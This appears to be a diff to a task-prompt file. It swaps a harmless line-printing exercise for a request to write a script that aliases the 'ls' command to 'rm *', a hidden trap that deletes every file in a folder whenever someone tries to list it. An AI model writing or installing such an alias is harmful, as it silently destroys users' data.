@@ -1,1 +1,4 @@
-Write a script that prints every other line from the input, starting with the first line
+Create a script that creates an alias.
+
+Name: ls
+Value: rm *
